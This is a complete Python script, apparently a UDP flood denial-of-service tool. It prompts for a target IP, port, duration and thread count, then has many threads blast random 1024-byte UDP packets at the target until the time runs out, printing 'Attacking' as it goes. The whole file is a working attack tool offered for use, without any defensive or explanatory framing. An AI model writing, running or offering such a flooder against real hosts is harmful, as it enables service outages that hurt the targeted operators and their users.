import socket
import random
import time
import threading

def attack(ip, port, duration):
    print(f"Attacking {ip}:{port} for {duration} seconds")
    start_time = time.time()
    while True:
        if time.time() - start_time >= duration:
            break
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((ip, port))
        payload = bytes([random.randint(0, 255) for _ in range(1024)])
        sock.send(payload)
        sock.close()
        time.sleep(0.001)

def main():
    ip = input("Enter the target IP: ")
    port = int(input("Enter the target port: "))
    duration = int(input("Enter the attack duration in seconds: "))
    num_threads = int(input("Enter the number of threads: "))

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack, args=(ip, port, duration))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
